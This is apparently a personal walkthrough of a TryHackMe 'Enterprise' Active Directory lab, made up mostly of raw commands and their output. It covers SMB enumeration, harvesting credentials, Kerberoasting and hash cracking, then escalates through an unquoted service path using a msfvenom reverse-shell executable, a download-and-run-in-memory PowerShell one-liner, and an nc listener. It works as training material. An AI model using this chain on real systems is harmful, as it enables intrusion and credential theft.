@@ -1,0 +1,487 @@
+0. 
+kali@kali:~/tools$ nmap -sV -p-  10.10.104.57
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 17:50 EST
+Nmap scan report for 10.10.104.57
+Host is up (0.036s latency).
+Not shown: 65507 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-05 22:51:45Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+7990/tcp  open  http          Microsoft IIS httpd 10.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.60 seconds
+
+1. 
+
+nikto -url 10.10.104.57
+--nothing--
+
+2.
+
+dirbuster
+thread = 200
+wordlist : 1-2-3-medium-directories
+ext: php,txt,xml
+--Nothing--
+
+3. 
+root@kali:~# smbclient -L 10.10.104.57
+Password for [WORKGROUP\root]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Docs            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      Users Share. Do Not Touch!
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.104.57 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+root@kali:~# smbclient --no-pass  //10.10.104.57/Users
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Thu Mar 11 21:11:49 2021
+  ..                                 DR        0  Thu Mar 11 21:11:49 2021
+  Administrator                       D        0  Thu Mar 11 16:55:48 2021
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
+  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
+  Default                           DHR        0  Thu Mar 11 19:18:03 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
+  Public                             DR        0  Thu Mar 11 16:27:02 2021
+
+                15587583 blocks of size 4096. 9898567 blocks available
+
+Users:
+Administrators
+altbitbucket
+bitbucket
+LAB-ADMIN
+
+3.1
+smb: \LAB-ADMIN\AppData\Local\Microsoft\Credentials\> ls
+  .                                 DSn        0  Thu Mar 11 19:28:46 2021
+  ..                                DSn        0  Thu Mar 11 19:28:46 2021
+  DFBE70A7E5CC19A398EBF1B96859CE5D   AHSn    11152  Thu Mar 11 18:09:04 2021
+
+                15587583 blocks of size 4096. 9890599 blocks available
+3.2
+smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> ls
+  .                                   D        0  Thu Mar 11 23:00:39 2021
+  ..                                  D        0  Thu Mar 11 23:00:39 2021
+  Consolehost_hisory.txt              A      424  Thu Mar 11 22:51:46 2021
+
+                15587583 blocks of size 4096. 9888671 blocks available
+smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> cat Consolehost_hisory.txt
+get Consolehost_hisory.txt:
+echo "replication:101RepAdmin123!!">private.txt
+
+
+4.
+kali@kali:~/TRYHACKME/Enterprice$ smbclient --no-pass  //10.10.104.57/Docs
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Mar 14 22:47:35 2021
+  ..                                  D        0  Sun Mar 14 22:47:35 2021
+  RSA-Secured-Credentials.xlsx        A    15360  Sun Mar 14 22:46:54 2021
+  RSA-Secured-Document-PII.docx       A    18432  Sun Mar 14 22:45:24 2021
+
+                15587583 blocks of size 4096. 9894179 blocks available
+kali@kali:~/TRYHACKME/Enterprice$ file RSA-Secured-Credentials.xlsx
+RSA-Secured-Credentials.xlsx: CDFV2 Encrypted
+kali@kali:~/TRYHACKME/Enterprice$ file RSA-Secured-Document-PII.docx
+RSA-Secured-Document-PII.docx: CDFV2 Encrypted
+
+
+
+5. 
+https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
+histroy of Nik-enterprise-dev /
+mgmtScript.ps1
+
+Import-Module ActiveDirectory
+$userName = 'nik'
+$userPassword = 'ToastyBoi!'
+$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
+$Computers = New-Object -TypeName "System.Collections.ArrayList"
+$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
+for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
+
+
+6.
+ali@kali:~/TRYHACKME/Enterprice$ crackmapexec smb 10.10.104.57 -u 'nik' -p 'ToastyBoi!' --shares
+SMB         10.10.104.57    445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.10.104.57    445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
+SMB         10.10.104.57    445    LAB-DC           [+] Enumerated shares
+SMB         10.10.104.57    445    LAB-DC           Share           Permissions     Remark
+SMB         10.10.104.57    445    LAB-DC           -----           -----------     ------
+SMB         10.10.104.57    445    LAB-DC           ADMIN$                          Remote Admin
+SMB         10.10.104.57    445    LAB-DC           C$                              Default share
+SMB         10.10.104.57    445    LAB-DC           Docs            READ            
+SMB         10.10.104.57    445    LAB-DC           IPC$            READ            Remote IPC
+SMB         10.10.104.57    445    LAB-DC           NETLOGON        READ            Logon server share 
+SMB         10.10.104.57    445    LAB-DC           SYSVOL          READ            Logon server share 
+SMB         10.10.104.57    445    LAB-DC           Users           READ            Users Share. Do Not Touch!
+
+kali@kali:~/TRYHACKME/Enterprice$ crackmapexec smb 10.10.104.57 -u 'replication' -p '101RepAdmin123' --shares
+SMB         10.10.104.57    445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.10.104.57    445    LAB-DC           [-] LAB.ENTERPRISE.THM\replication:101RepAdmin123 STATUS_LOGON_FAILURE 
+
+
+
+7. WinRM?
+
+kali@kali:~/TRYHACKME/Enterprice$ crackmapexec winrm 10.10.104.57 -u 'nik' -p 'ToastyBoi!'
+SMB         10.10.104.57    5985   LAB-DC           [*] Windows 10.0 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)
+HTTP        10.10.104.57    5985   LAB-DC           [*] http://10.10.104.57:5985/wsman
+WINRM       10.10.104.57    5985   LAB-DC           [-] LAB.ENTERPRISE.THM\nik:ToastyBoi!
+
+8. RPCclient:
+kali@kali:~/TRYHACKME/Enterprice$ rpcclient 10.10.104.57 -U 'nik'
+Password for [WORKGROUP\nik]:
+rpcclient $> help
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[atlbitbucket] rid:[0x3e8]
+user:[bitbucket] rid:[0x452]
+user:[nik] rid:[0x453]
+user:[replication] rid:[0x454]
+user:[spooks] rid:[0x455]
+user:[korone] rid:[0x456]
+user:[banana] rid:[0x457]
+user:[Cake] rid:[0x458]
+user:[contractor-temp] rid:[0x45c]
+user:[varg] rid:[0x45d]
+user:[joiner] rid:[0x45f]
+
+rpcclient $> enumdomgroups
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[DnsUpdateProxy] rid:[0x44f]
+group:[Password-Policy-Exemption] rid:[0x459]
+group:[Contractor] rid:[0x45a]
+group:[sensitive-account] rid:[0x45b]
+group:[adobe-subscription] rid:[0x45e]
+
+
+
+
+
+9. 
+ali@kali:~/TRYHACKME/Enterprice$ python3 ../../tools/HACKER-OS-impacket/examples/GetUserSPNs.py -dc-ip 10.10.173.121 LAB.ENTERPRISE.THM/nik:ToastyBoi! 
+Impacket v0.9.25.dev1+20220407.165653.68fd6b79 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             
+
+kali@kali:~/TRYHACKME/Enterprice$ python3 ../../tools/HACKER-OS-impacket/examples/GetUserSPNs.py -dc-ip 10.10.173.121 LAB.ENTERPRISE.THM/nik:ToastyBoi!  -request -outputfile hash_bitbucket_spn.txt
+
+kali@kali:~/TRYHACKME/Enterprice$ cat hash_bitbucket_spn.txt
+$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$a5aa6fc5a448ac1feb4a097b0e269632$958630fdad4441aa97d1ba081f128e311b9c2ebef969d4cd70df6da1cb7619efba1208488a23369defcf83b521fb8becc73a7a507ef9f372af6be7f04e6d1dd6573f1b99b8ad31a2dcff8e615bd428e11889c30f4682508b4193e8e2f80353af3b0cd20762afe018c7c1f34a79da8df4a44b73f22c262ca4529917476941255fe463e7d293a398826ca2e64d67eae81ec74e290ef310c62a228ab9c547ed398347537188c027ecf9d404bb5b15f3412ad9042847959f6f0fe44fcb1310c990449c359feed0519cd1aba8ab2cae1c5f8fc1fdf59cbae701a070360e6a71dde0a3606694f8786847b73da0d84e4da50efdba05edd74db7b970f4a0a1f6a05a1d7956b70c82c598492188399e91bd7852e02be68d4abc15a8f586ede6fe40274599e06a5250edbfe943f955333a812648ea3edb608495c4a2e6b3ccdbe83cc17cf07b3be81ef2f489c5b01200945f6aaf35c2e20e7240039978f787aa6f9a5b1d8fd702f2ef9281d48aa034279843f9992b8ffb8d7eebd7a090a89d3a2442c60b7a037df27adf41d282b5eb958cb0556c78b3ffcee6239d16800cfb3291176b8aa2665cba79464b4df3d20fa2d833e8450449c802f761546b29e7ff604f458affa8f064e88c50eb57fdbb9c3ea2044e366daffcddd9d209befab3bdf66f51f76742a092177f9740bcc1a34fa593d155c5322e83fe4ee988313ffd49b6039f94cc306b594d76dfafcf903606d0958ffa71e42ae489c13f2636f6abade65317d90039182aedc7447d83fc4039d61ee633bc3f3bf23a2e603990d09e0996164d9fa5d9d40c41a5cf7c5cd582a6bb798a3265f2dc8ea0809dd873c44d65dbce6bdce2475120d45e4de1d9872f82d4da3315c13cf89b23f416ca11445010aaa60282c0569e74879afc22826b8cd5ef638d592c801485bb5a9f0f24eba73e992d22307d7366883e767c0a9f69646fe8a55f9444a4c696b10e42595e474dba484d1261baaf5e3336165c1ebee382c08fa90082f78e45e6a1c33bab0a521786ef14a9e03be527e99a4d1099d9c18665f98023d50e00cd1228f6a585a9f7d1bae0de07fc7c7bb8003bea621ae6dc7504ddfa27136b5a61cf5295065901ea9901836fe7a56685f5e46bfc12072f1b3d8089be94622bbbcc69d06a99e76aeefc9f7d55ae8c2cfaa99e9c5b527067c231e73b9f786a472c1dbd909b535c00356300744c2ea46b7e77cad7d071ccac8818dcdbf222f0d0368962fd687f3076b79d38c8dd1bbc9b6c65eb258345293dfc9e61d6b57f38c25c136cec87f16bde6b9134c2d6dd375b97660fce5e3bcc6bece8d795722397321fc3883628cbebc359357c8d27c0b908d2b3e57f
+
+kali@kali:~/TRYHACKME/Enterprice$ john 
+John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
+Copyright (c) 1996-2021 by Solar Designer and others
+Homepage: https://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+
+Use --help to list all available options.
+kali@kali:~/TRYHACKME/Enterprice$ john hash_bitbucket_spn.txt -w=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littleredbucket  (?)     
+1g 0:00:00:01 DONE (2023-03-06 15:47) 0.6451g/s 1013Kp/s 1013Kc/s 1013KC/s livelife93..littled9
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+kali@kali:~/TRYHACKME/Enterprice$ rdesktop 10.10.173.121 -d  LAB.ENTERPRISE.THM -u nik -p ToastyBoi! 
+Autoselecting keyboard map 'en-us' from locale
+
+THM{ed882d02b34246536ef7da79062bef36}
+
+10. Priv escalation
+Windows Privilege Escalation — (Unquoted Service Path)
+
+```bash
+# Get latest release
+$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+# Before cmd in 3 lines
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+
+    Provides support for synchronizing objects between the host and guest operating systems.
+   =================================================================================================
+
+    zerotieroneservice(zerotieroneservice)[C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe] - Auto - Stopped - No quotes and Space detected
+    File Permissions: Users [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Zero Tier\Zero Tier One (Users [WriteData/CreateFiles])
+   =================================================================================================
+10.1 create Get-Servcieacl
+https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
+
+Add-Type  @"
+  [System.FlagsAttribute]
+  public enum ServiceAccessFlags : uint
+  {
+      QueryConfig = 1,
+      ChangeConfig = 2,
+      QueryStatus = 4,
+      EnumerateDependents = 8,
+      Start = 16,
+      Stop = 32,
+      PauseContinue = 64,
+      Interrogate = 128,
+      UserDefinedControl = 256,
+      Delete = 65536,
+      ReadControl = 131072,
+      WriteDac = 262144,
+      WriteOwner = 524288,
+      Synchronize = 1048576,
+      AccessSystemSecurity = 16777216,
+      GenericAll = 268435456,
+      GenericExecute = 536870912,
+      GenericWrite = 1073741824,
+      GenericRead = 2147483648
+  }
+"@
+
+function Get-ServiceAcl {
+    [CmdletBinding(DefaultParameterSetName="ByName")]
+    param(
+        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ParameterSetName="ByName")]
+        [string[]] $Name,
+        [Parameter(Mandatory=$true, Position=0, ParameterSetName="ByDisplayName")]
+        [string[]] $DisplayName,
+        [Parameter(Mandatory=$false, Position=1)]
+        [string] $ComputerName = $env:COMPUTERNAME
+    )
+
+    # If display name was provided, get the actual service name:
+    switch ($PSCmdlet.ParameterSetName) {
+        "ByDisplayName" {
+            $Name = Get-Service -DisplayName $DisplayName -ComputerName $ComputerName -ErrorAction Stop | 
+                Select-Object -ExpandProperty Name
+        }
+    }
+
+    # Make sure computer has 'sc.exe':
+    $ServiceControlCmd = Get-Command "$env:SystemRoot\system32\sc.exe"
+    if (-not $ServiceControlCmd) {
+        throw "Could not find $env:SystemRoot\system32\sc.exe command!"
+    }
+
+    # Get-Service does the work looking up the service the user requested:
+    Get-Service -Name $Name | ForEach-Object {
+        
+        # We might need this info in catch block, so store it to a variable
+        $CurrentName = $_.Name
+
+        # Get SDDL using sc.exe
+        $Sddl = & $ServiceControlCmd.Definition "\\$ComputerName" sdshow "$CurrentName" | Where-Object { $_ }
+
+        try {
+            # Get the DACL from the SDDL string
+            $Dacl = New-Object System.Security.AccessControl.RawSecurityDescriptor($Sddl)
+        }
+        catch {
+            Write-Warning "Couldn't get security descriptor for service '$CurrentName': $Sddl"
+            return
+        }
+
+        # Create the custom object with the note properties
+        $CustomObject = New-Object -TypeName PSObject -Property ([ordered] @{ Name = $_.Name
+                                                                              Dacl = $Dacl
+                                                                            })
+
+        # Add the 'Access' property:
+        $CustomObject | Add-Member -MemberType ScriptProperty -Name Access -Value {
+            $this.Dacl.DiscretionaryAcl | ForEach-Object {
+                $CurrentDacl = $_
+
+                try {
+                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Translate([System.Security.Principal.NTAccount])
+                }
+                catch {
+                    $IdentityReference = $CurrentDacl.SecurityIdentifier.Value
+                }
+                
+                New-Object -TypeName PSObject -Property ([ordered] @{ 
+                                ServiceRights = [ServiceAccessFlags] $CurrentDacl.AccessMask
+                                AccessControlType = $CurrentDacl.AceType
+                                IdentityReference = $IdentityReference
+                                IsInherited = $CurrentDacl.IsInherited
+                                InheritanceFlags = $CurrentDacl.InheritanceFlags
+                                PropagationFlags = $CurrentDacl.PropagationFlags
+                                                                    })
+            }
+        }
+
+        # Add 'AccessToString' property that mimics a property of the same name from normal Get-Acl call
+        $CustomObject | Add-Member -MemberType ScriptProperty -Name AccessToString -Value {
+            $this.Access | ForEach-Object {
+                "{0} {1} {2}" -f $_.IdentityReference, $_.AccessControlType, $_.ServiceRights
+            } | Out-String
+        }
+
+        $CustomObject
+    }
+}
+
+PS C:\Users\bitbucket\Downloads> Import-Module .\Get-ServiceAcl.ps1
+PS C:\Users\bitbucket\Downloads>
+PS C:\Users\bitbucket\Downloads>
+PS C:\Users\bitbucket\Downloads> "zerotieroneservice" | Get-ServiceAcl
+
+PS C:\Users\bitbucket\Downloads> "zerotieroneservice" | Get-ServiceAcl | select -ExpandProperty Access
+
+
+ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac,
+                    WriteOwner
+AccessControlType : AccessAllowed
+IdentityReference : NT AUTHORITY\SYSTEM
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+
+ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac,
+                    WriteOwner
+AccessControlType : AccessAllowed
+IdentityReference : BUILTIN\Administrators
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+
+ServiceRights     : Start, Stop, PauseContinue, ReadControl
+AccessControlType : AccessAllowed
+IdentityReference : LAB-ENTERPRISE\bitbucket
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+
+ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
+AccessControlType : AccessAllowed
+IdentityReference : NT AUTHORITY\INTERACTIVE
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+
+
+10.2 prepere the reverse shell
+
+kali@kali:~/tools/PEASS-ng/winPEAS/winPEASexe$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.74.125 LPORT=555 -f exe -o Zero.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: Zero.exe
+kali@kali:~/tools/PEASS-ng/winPEAS/winPEASexe$ ls -ltr
+
+-rw-r--r--  1 kali kali   73802 Mar  7 17:12 Zero.exe
+
+kali@kali:~/tools/PEASS-ng/winPEAS/winPEASexe$ python3 -m http.server 9090
+Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
+10.10.188.63 - - [07/Mar/2023 17:15:42] "GET /Zero.exe HTTP/1.1" 200 -
+10.10.188.63 - - [07/Mar/2023 17:22:14] "GET /Zero.exe HTTP/1.1" 200 -
+
+
+10.3 upload the service
+
+PS C:\Program Files (x86)\Zero Tier> wget http://10.8.74.125:9090/Zero.exe -o Zero.exe
+PS C:\Program Files (x86)\Zero Tier>
+PS C:\Program Files (x86)\Zero Tier> dir
+
+
+    Directory: C:\Program Files (x86)\Zero Tier
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         3/7/2023   2:18 PM                Zero Tier One
+-a----         3/7/2023   2:22 PM          73802 Zero.exe
+
+
+PS C:\Program Files (x86)\Zero Tier> sc start "zerotieroneservice"
+PS C:\Program Files (x86)\Zero Tier> Stop-Service -name  "zerotieroneservice"
+PS C:\Program Files (x86)\Zero Tier> Start-Service -name  "zerotieroneservice"
+
+on kali:
+kali@kali:~/TRYHACKME/Enterprice$ rlwrap nc -lnvp 555
+listening on [any] 555 ...
+
+connect to [10.8.74.125] from (UNKNOWN) [10.10.188.63] 50441
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+C:\Windows\system32>
+
+:\>dir /s *oot.txt*
+dir /s *oot.txt*
+ Volume in drive C has no label.
+ Volume Serial Number is 7CD9-A0AE
+
+
+ Directory of C:\Users\Administrator\Desktop
+
+03/14/2021  06:49 PM                37 root.txt
+               1 File(s)             37 bytes
+            
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+THM{1a1fa94875421296331f145971ca4881}
+C:\Users\Administrator\Desktop>
+
+
+
